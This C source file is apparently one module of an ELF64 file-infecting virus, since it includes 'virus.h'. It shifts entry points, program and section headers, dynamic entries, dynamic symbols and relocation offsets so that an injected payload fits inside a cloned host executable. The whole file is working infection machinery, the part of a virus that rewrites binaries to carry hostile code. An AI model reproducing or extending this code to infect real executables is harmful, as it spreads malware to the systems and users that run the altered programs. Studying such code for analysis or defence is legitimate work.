#include "virus.h"
#include "errors.h"

#define is_loadable(type) (type == PT_LOAD)

struct data
{
	size_t	shift_amount;
	size_t	payload_offset;
	size_t	payload_addr;
};

static bool	adjust_header_values(struct safe_ptr clone_ref, size_t payload_offset,
			size_t shift_amount)
{
	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	elf_hdr->e_entry += shift_amount;

	Elf64_Off	e_phoff = elf_hdr->e_phoff;
	Elf64_Off	e_shoff = elf_hdr->e_shoff;

	if (e_shoff > payload_offset)
		elf_hdr->e_shoff += shift_amount;
	if (e_phoff > payload_offset)
		elf_hdr->e_phoff += shift_amount;

	return true;
}

static bool	adjust_phdr_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Phdr	*phdr = safe(ref, offset, sizeof(Elf64_Phdr));

	if (phdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	Elf64_Off	p_offset = phdr->p_offset;
	Elf64_Addr	p_vaddr  = phdr->p_vaddr;

	struct data	*closure = data;
	const size_t	payload_offset = closure->payload_offset;
	const size_t	payload_addr   = closure->payload_addr;
	const size_t	shift_amount   = closure->shift_amount;

	if (p_offset == payload_offset)
	{
		phdr->p_filesz += shift_amount;
		phdr->p_memsz += shift_amount;
	}
	if (p_offset > payload_offset)
	{
		phdr->p_offset += shift_amount;
	}
	if (p_vaddr > payload_addr)
	{
		phdr->p_vaddr += shift_amount;
		phdr->p_paddr += shift_amount;
	}
	return true;
}

static bool	adjust_dynamic_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Dyn	*dynamic = safe(ref, offset, sizeof(Elf64_Dyn));

	if (dynamic == NULL)
		return false;

	Elf64_Sxword	d_tag = dynamic->d_tag;
	Elf64_Addr	d_ptr = dynamic->d_un.d_ptr;

	struct data 	*closure = data;
	size_t		payload_addr = closure->payload_addr;
	size_t		shift_amount = closure->shift_amount;

	if (d_tag == DT_NULL) goto end;

	// Address of the initialization / termination function
	if ((d_tag == DT_INIT  || d_tag == DT_FINI
	// Address of string / symbol table
	||  d_tag == DT_STRTAB || d_tag == DT_SYMTAB
	// Address of Rel / Rela relocation table
	||  d_tag == DT_RELA   || d_tag == DT_REL
	// Address of init_array / fini_array
	|| d_tag == 0x19       || d_tag == 0x1a
	// Address of symbol hash table
	|| d_tag == DT_HASH
	// Address of PLT and/or GOT
	|| d_tag == DT_PLTGOT
	// Address of relocation entries associated solely with the PLT
	|| d_tag == DT_JMPREL)
	&& (d_ptr >= payload_addr))
	{
		dynamic->d_un.d_ptr += shift_amount;
	}
end:
	return true;
}

static bool	adjust_dynsym_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Sym	*dynsym = safe(ref, offset, sizeof(Elf64_Sym));

	if (dynsym == NULL)
		return false;

	Elf64_Addr	st_value = dynsym->st_value;

	struct data	*closure = data;
	size_t		payload_addr = closure->payload_addr;
	size_t		shift_amount = closure->shift_amount;

	if (st_value >= payload_addr)
	{
		dynsym->st_value += shift_amount;
	}
	return true;
}

static bool	adjust_rel_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Rela	*rel = safe(ref, offset, sizeof(Elf64_Rel));

	if (rel == NULL)
		return false;

	struct data	*closure = data;
	size_t		payload_addr = closure->payload_addr;
	size_t		shift_amount = closure->shift_amount;

	Elf64_Addr	r_offset = rel->r_offset;

	if (r_offset >= payload_addr)
	{
		rel->r_offset += shift_amount;
	}
	return true;
}

static bool	adjust_rela_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Rela	*rela = safe(ref, offset, sizeof(Elf64_Rela));

	if (rela == NULL)
		return false;

	struct data	*closure = data;
	size_t		payload_addr = closure->payload_addr;
	size_t		payload_offset = closure->payload_offset;
	size_t		shift_amount = closure->shift_amount;

	Elf64_Addr	r_offset = rela->r_offset;
	int64_t		r_addend = rela->r_addend;

	if (r_offset >= payload_addr)
	{
		rela->r_offset += shift_amount;
	}
	if (r_addend >= payload_offset)
	{
		rela->r_addend += shift_amount;
	}
	return true;
}

static bool	adjust_shdr_values(struct safe_ptr ref, size_t offset, void *data)
{
	Elf64_Shdr	*shdr = safe(ref, offset, sizeof(Elf64_Shdr));

	if (shdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	Elf64_Off	sh_offset = shdr->sh_offset;
	Elf64_Addr	sh_addr   = shdr->sh_addr;
	uint32_t	sh_type   = shdr->sh_type;

	struct data	*closure = data;
	const size_t	payload_offset = closure->payload_offset;
	const size_t	payload_addr   = closure->payload_addr;
	const size_t	shift_amount   = closure->shift_amount;

	if (sh_offset == payload_offset)
	{
		shdr->sh_size += shift_amount;
	}
	if (sh_offset > payload_offset)
	{
		shdr->sh_offset += shift_amount;
	}
	if (sh_addr > payload_addr)
	{
		shdr->sh_addr += shift_amount;
	}
	if (sh_type == SHT_DYNSYM)
	{
		foreach_shdr_entry(ref, offset, adjust_dynsym_values, closure);
	}
	else if (sh_type == SHT_REL)
	{
		foreach_shdr_entry(ref, offset, adjust_rel_values, closure);
	}
	else if (sh_type == SHT_RELA)
	{
		foreach_shdr_entry(ref, offset, adjust_rela_values, closure);
	}
	else if (sh_type == SHT_DYNAMIC)
	{
		foreach_shdr_entry(ref, offset, adjust_dynamic_values, closure);
	}
	return true;
}

bool		adjust_references(struct safe_ptr clone_ref,
			struct entry clone_entry, size_t shift_amount)
{
	const size_t	payload_offset = clone_entry.payload_offset;
	const size_t	payload_addr = clone_entry.payload_addr;

	if (!adjust_header_values(clone_ref, payload_offset, shift_amount))
		return false;

	struct data	closure;

	closure.shift_amount   = shift_amount;
	closure.payload_offset = payload_offset;
	closure.payload_addr   = payload_addr;

	if (!foreach_phdr(clone_ref, adjust_phdr_values, &closure))
		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
	if (!foreach_shdr(clone_ref, adjust_shdr_values, &closure))
		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);

	return true;
}
